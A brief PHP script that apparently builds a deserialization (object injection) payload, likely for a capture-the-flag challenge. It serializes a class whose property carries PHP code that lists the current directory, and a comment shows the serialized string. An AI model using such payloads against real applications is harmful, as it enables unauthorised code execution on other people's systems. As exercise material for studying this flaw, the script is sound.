<?php
class OowoO {
    public $mdzz="print_r(scandir(dirname(__FILE__)));";
    function __construct() {
        $this->mdzz = "print_r(scandir(dirname(__FILE__)));";
    }
}

echo serialize(new OowoO());
//O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
?>
